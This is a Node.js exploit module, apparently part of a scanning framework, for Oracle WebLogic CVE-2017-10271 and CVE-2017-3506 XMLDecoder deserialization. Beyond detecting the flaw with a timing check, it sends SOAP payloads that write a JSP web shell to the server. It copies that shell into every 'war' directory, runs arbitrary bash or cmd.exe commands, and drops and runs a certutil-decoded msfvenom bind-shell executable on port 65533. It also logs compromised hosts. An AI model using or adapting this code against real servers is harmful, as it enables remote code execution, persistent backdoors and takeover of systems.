module.exports={
  tags:"weblogic,CVE-2017-10271,10271,3506",
  dependencies:"payload/[x.jsp,*.sh],msfvenom,curl",
	"ID":"030103",
  des:"CVE-2017-10271,weblogic CVE-2017-10271,CVE-2017-3506Vulnerability detection",
  /*
  why can not run x.jsp?
  file : xx/config/config.xml
  <connection-filter>weblogic.security.net.ConnectionFilterImpl</connection-filter>
    <connection-filter-rule>12.18.98.0/32 * * allow t3 t3s</connection-filter-rule>
    <connection-filter-rule>0.0.0.0/0 * * deny t3 t3s</connection-filter-rule>
    <connection-logger-enabled>true</connection-logger-enabled>    
  */
  fnCheckWebShell:function(xUrl,fnCbk2,cmd)
  {
    // var szRunAl = `sed --silent -i --follow-symlinks 's/<connection-filter>weblogic\.security\.net\.ConnectionFilterImpl<\/connection-filter>.*/<connection-filter>weblogic\.security\.net\.ConnectionFilterImpl<\/connection-filter><connection-filter-rule>192\.168\.28\.123 \* \* allow t3 t3s<\/connection-filter-rule>/g' config.xml>config.xml.bak;mv config.xml.bak config.xml`;
    var _t = this,_s = this.self,hst = _s.parseUrl(xUrl);
    if(_t.oUrls[xUrl])return;
    _s.log("check " + xUrl);
    var oOpt = _s.fnOptHeader({
      method: 'POST',
      timeout:7000,
      uri: xUrl
        ,headers:
        {
          "Host":hst.host,
          "User-Agent": "Mozilla/5.0 (windows; U; Intel 18; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
          "Accept-Encoding":"zh-CN,zh"
        }});
    if(cmd)
    {
      oOpt.uri = oOpt.uri.replace(/\?([^=]+)=.*$/gmi,"");
      oOpt.body = xUrl.replace(/(^.*?\?)|(=.*?$)/gmi,"") + encodeURIComponent(cmd);
      // console.log(oOpt.body)
      oOpt.headers["content-type"] = "application/x-www-form-urlencoded";
    }
    _s.request(oOpt,function(e,r,b)
    {
      if(_t.oUrls[xUrl])return;
      if(e)return _s.error(e,xUrl);
      var szRk = "ip:"
      // _s.log("curl '" + xUrl + "'");
      b = String(b);
      // console.log( b);
      // "Not Found;302 Moved Temporarily"
      var hvIp = -1 < b.indexOf(szRk);
      if(fnCbk2)fnCbk2(hvIp);
      if(hvIp)
      {
        _s.emit('jspShell',xUrl, _t);
        try{_s.oUrls[xUrl]=1;}catch(e){}
        // console.log(b);
        b = b.replace(/(^\s*)|(\s*$)/gmi,'');
        _s.log("curl '" + xUrl + "'");
        if(-1 == String(b).indexOf("404--Not Found"))
          _s.log(b);
        _s.fs.appendFile("data/Ok.txt", xUrl + "\n",function(){});
      }
      else
      {
        if(-1 == String(b).indexOf("404--Not Found"))
        _s.log("get: " + xUrl + "\n" + b);
      }
      return;
    });
  },
  uploadPayload:function(fileName,code,url,fnCbk)
  {

    var _t = this,_s = this.self;
    var s = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.8.0_131" class="java.beans.XMLDecoder">
        <object class="java.io.PrintWriter">
            <string>{fileName}</string><void method="println">
              <string><![CDATA[{code}]]></string></void><void method="close"/>
        </object>
    </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

*/});
    s = s.replace(/\{fileName\}/gmi, fileName).replace(/\{code\}/gmi, code);
    _t.sendPayload(url,s,null,function(e,r,b)
    {
      // 似乎判断<faultstring>不准确
      _s.error(e);
      // console.log(url);console.log(e);
      // console.log(e||b)
       if(-1 < String(b).indexOf("<faultstring>"))
       {
          fnCbk(fileName,url);
       }
    });
  },
  cmdPayload:function(url,osBash,cmd,fnCbk)
  {
    var _t = this,_s = this.self;
    var s1_ = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>{bash}</string>
              </void>
              <void index="1">
                <string>{c}</string>
              </void>
              <void index="2">
                <string><![CDATA[{code}]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/});
    var bType = -1 < osBash.indexOf("cmd"),sB = bType ? "cmd.exe" : "/bin/bash";
    s1_ = s1_.replace(/\{bash\}/gmi,sB).replace(/\{c\}/gmi, bType?"/c":"-c").replace(/\{code\}/gmi, cmd);
    
    // console.log(url)
    _t.sendPayload(url,s1_,{timeout:10000},function(e,r,b)
    {
      /*//////
      if(e)
      {
        // console.log("timeout: " + this.timeout);
        // console.log(url);
        // console.log(s1_);
        var x = e.toString();
        // console.log(e);
       return;
      }//////////*/ 
      
       if(-1 < String(b).indexOf("<faultstring>"))
       {
          if(fnCbk)fnCbk('',url);
       }
    });
  },
  sendPayload:function(url, szPayload, opt, fnCbk)
  {
    var _t = this,_s = this.self;
    var hst = _s.parseUrl(url);

    var oOpt = _s.fnOptHeader({
            method: 'POST',
            uri: url,
            // timeout:5000,
            body:szPayload
              ,headers:
              {
                "Host":hst.host,
                "User-Agent": "Mozilla/5.0 (windows; U; Intel 18; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                "Accept-Encoding":"zh-CN,zh",
                "content-type":"text/xml;charset=UTF-8"
              }});
    if(opt)
    {
      for(var k in opt)
      {
        if(opt[k])oOpt[k]= opt[k];
      }
      
    }
    _s.request(oOpt, fnCbk);
  },
  oUrls:{},
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271",
    "https://github.com/Medicean/VulApps",
    "https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271"],
	doCheck:function (url,fnCbk)
	{
  /*<!--
    <void class="org.apache.commons.ognl.Ognl">
        <object method="getValue">
          <string><![CDATA[(#response=@org.apache.struts2.ServletActionContext@getResponse()).(#response.addHeader('struts2','_struts2_'))]]></string>
          <object class="java.util.HashMap"></object>
        </object>
    </void>
    -->*/
		var _t = this,_s = this.self, szOld = url,bBreakFor1 = false,
       // 后期完善，尝试对多个path进行测试
       aPath = '/wls-wsat/CoordinatorPortType,/wls-wsat/CoordinatorPortType11,/wls-wsat/ParticipantPortType,/wls-wsat/ParticipantPortType11,/wls-wsat/RegistrationPortTypeRPC,/wls-wsat/RegistrationPortTypeRPC11,/wls-wsat/RegistrationRequesterPortType,/wls-wsat/RegistrationRequesterPortType11'.split(',');
/*
1、timebase
2、run
3、upload file
*/
    var s = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java class="java.beans.XMLDecoder">
		<void class="java.lang.Thread">
		  	<void method="sleep">
		  		<long>{num}</long>
		  	</void>
		</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

*/});
    var oUrls =_t.oUrls,szRk = "ip:", g_nFlg = 0, szJspName = "X11.jsp",fnTmp1,ks5;
    var bBreakFor = false,hst = _s.parseUrl(url);

		var nNum = new Date().getTime()/1000,nTime = 0,fCbk = function(b,r,e,u,fnCbk2)
     {
         // _s.log("check all " + u)
         // 验证
        if(-1 < u.indexOf('/wls-wsat/')||-1 < u.indexOf('/bea_wls_internal/'))
        {
          var aT = "bea_wls_cluster_internal;cloudstore;bea_wls_internal;wls-wsat;bea_wls_deployment_internal;bea_wls_management_internal2;consoleapp;uddiexplorer;uddi".split(/;/);
          bBreakFor = false;
          var fnFor = function(xUrl)
            {
              if(oUrls[xUrl])
              {
                _s.log("已经验、跳过、证过 " + xUrl)
                return;
              }
              _s.log("test:\n curl '" + xUrl + "'");
              // console.log("start " + xUrl);
              // _s.fnGetRequest(_s.request,{timeout:1000})
              _s.log("test " + xUrl);
              _s.request.get({uri:xUrl,timeout:20000},function(e,r,b)
              {
                if(oUrls[xUrl])return;
                if(e || !b)
                {
                    _s.log(xUrl + " " + e.toString());
                  return;
                }
                
                _s.log("curl '" + xUrl + "'");
                b = String(b);
                // console.log( b);
                // "Not Found;302 Moved Temporarily"
                var hvIp = -1 < b.indexOf(szRk);
                if(fnCbk2)fnCbk2(hvIp);
                if(hvIp)
                {
                  _s.emit('jspShell',xUrl, _t);
                  oUrls[xUrl]=1;
                  j = 10000;aT = [];bBreakFor=true; // break for
                  // console.log("停止： " + xUrl + "\n" + b);
                  b = b.replace(/(^\s*)|(\s*$)/gmi,'');
                  _s.log("Ok:\ncurl '" + xUrl + "'");
                  
                  if(b && -1 == String(b).indexOf("404--Not Found"))_s.log(b);
                  _s.fs.appendFile("data/Ok.txt", xUrl + "\n",function(){});
                  fnCbk({});
                }
                else
                {
                  if(-1 == String(b).indexOf("Not Found"))
                  _s.log("get: " + xUrl + "\n" + b);
                }
                return;
              });
            };
          for(var j = 0; j < aT.length; j++)
          {
            if(bBreakFor)break;
            (function(xxU){
              // _s.log(u + "\n======\n" + u.replace(/(wls\-wsat)|(bea_wls_internal)/gmi, xxU));
              fnFor(u.replace(/(wls\-wsat)|(bea_wls_internal)/gmi, xxU));  
            })(aT[j]);
          }
        }
     };;
		// s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// 打开注释，测试存在漏洞的情况下，防火墙有没有限制主动向外连接
		// s = s5;
    // console.log(s);
    // console.log(hst);
    var oCTmp = _s.getX11_linuxShell("{code}"), s1_1 = oCTmp.c;
        szJspName = oCTmp.j;
    var szTmpUrl = [hst.protocol,"//", hst.host,"/bea_wls_internal/",szJspName,""].join("");
    fnTmp1 = function(p11,szPld,fnTmpCbk,szTUrl,fnCbk2)
        {
           // console.log("fnTmp1")
           s = szPld||s;
           nNum = new Date().getTime()/1000,nTime = 0;
           nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
           s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
           var url1 = szOld.substr(0, szOld.indexOf('/',13));
           url = url1 + p11;// '/wls-wsat/CoordinatorPortType'
          // console.log(url);
          var oOpt = {timeout: nTime + 80000};
          _t.sendPayload(url,szPld||s, oOpt, function (error, response, body)
          {
              if(fnTmpCbk){fnTmpCbk(body,response,error,url1 + szTUrl,fnCbk2);return;}
              body = String(body || response && response.statusCode || error||"");
              if(-1 < body.indexOf("Error: ESOCKETTIMEDOUT"))
                {
                  // _t.fnCheckWebShell(szTmpUrl);
                  // console.log(szTmpUrl)
                  body = "ESOCKETTIMEDOUT",error=null;
                }
              _s.error(error);

              if(-1 < String(body).indexOf("Invalid attribute for element void:class"))
              {
                _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (body||""));
                return;
              }
              var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
              // console.log(String(body));
              // console.log([nT,nT2]);
              // console.log(response.headers);
              if(-1 == String(body).indexOf("404--Not Found"))
                _s.log(body);
              if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
              {
                var r = {vul:true,"body":String(body),href:response.request.uri.href,"url":szOld,"send":s,"des":
                  "发现高危漏洞 WebLogic CVE-2017-10271 反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
                  statusCode:(response && response.statusCode||0)};
                  // X-Powered-By,Set-Cookie,Date
                  // X-Pad: avoid browser bug
                // console.log(r);
                if(r && r.vul)
                {
                   bBreakFor1 = true;
                   
                   if(global.X11){return fnCbk({},_t);}// 确保只执行一次
                   else
                   {
                       global.X11=true;

                       // 先发通杀win、linux的payloa
                       _s.log("send payload: win or linux ,web shell to servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + szJspName);
                       var szUrl = [hst.protocol,"//", hst.host,aPath[0]].join(""), ckCbk = null,
                           szJspPayload = _s.fs.readFileSync("payload/x.jsp").toString("utf-8");
                       _t.uploadPayload("servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + szJspName,
                          szJspPayload,szUrl,ckCbk = function()
                      {
                        _s.log("check xxx " + szTmpUrl);
                        _t.fnCheckWebShell(szTmpUrl);
                        // fCbk('','','',ssT);
                      });

                       // 还要拷贝后才能验证
                       _s.log("send payload: win or linux ,web shell ./" + szJspName);
                       _t.uploadPayload(szJspName, szJspPayload,szUrl,function(){
                          var fnCbktmp = function()
                          {
                            fCbk('','','',szTmpUrl);
                          };
                          var szBash = "find / -type d -name 'war' 2>/dev/null|xargs -I K cp -f " + szJspName +  " K/" + szJspName;
                          _s.log("send payload: linux ,run: " + szBash);
                          _t.cmdPayload(szUrl,'/bin/bash', szBash,fnCbktmp);
                          szBash = "for /f %i in ('dir /s /b war') do copy /y " + szJspName + " %i\\" + szJspName;
                          _s.log("send payload: win ,run: " + szBash);
                          _t.cmdPayload(szUrl,'cmd.exe', szBash,fnCbktmp);
                       });

                       // win 后渗透，暂且注释
                       _s.log("msfvenom genarate noWWW_P65533.exe,send payload: win exe2txt ./noWWW_P65533.exe");
                       _s.child_process.execSync(_s.config.noWwwBind.win);
                       if(_s.fs.existsSync("payload/noWWW_P65533.exe"))
                       _t.uploadPayload("noWWW_P65533.txt",
                          szJspPayload = _s.fs.readFileSync("payload/noWWW_P65533.exe").toString("base64"),szUrl,ckCbk = function()
                      {
                          _s.log("send payload: win ,run noWWW_P65533");
                          _t.cmdPayload(szUrl,'cmd.exe', "certutil -decode noWWW_P65533.txt noWWW_P65533.exe",function()
                          {
                            _s.log("decode out noWWW_P65533.exe");
                            _t.cmdPayload(szUrl,'cmd.exe', "noWWW_P65533.exe",function()
                            {
                              _s.log("check noWWW_P65533.exe");
                              _s.log("check xxx " + szTmpUrl);
                              _t.fnCheckWebShell(szTmpUrl.replace(/whoami/gmi, "netstat -anto|findstr \":65533\""));
                            });
                          });
                      });

                       // _s.log([oCTmp.c,szJspName]);
                      _s.log("send payload: linux, bash make all war/" + szJspName);
                      _t.cmdPayload(szUrl,'/bin/bash',s1_1,function()
                      {
                        fCbk('','','',szTmpUrl);
                      });

                       // fnTmp1(aPath[0],s = s1_1,fCbk,"/wls-wsat/" + szJspName);
                   }
                }
                fnCbk(r,_t);
                r = null;
              }
              else
              {
                var szTmp = String(body||"").trim();
                szTmp = "undefined" == szTmp ? "":szTmp;
                if(-1 < szTmp.indexOf("<faultstring>0</faultstring>"))
                {
                  _s.log(_s.child_process.execSync(`curl -k -s -v ${hst.protocol}//${hst.host}/bea_wls_internal/${szJspName}`).toString());
                }
                else
                {
                  if(-1 == String(szTmp).indexOf("404--Not Found"))
                  _s.log("2、没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + szTmp);
                }
              }
              //_s.log(body);
             }
           );
        };
    for(var i = 0; i < aPath.length; i++)
    {
      if(bBreakFor1)break;
      fnTmp1(aPath[i]);
    }
	}
};
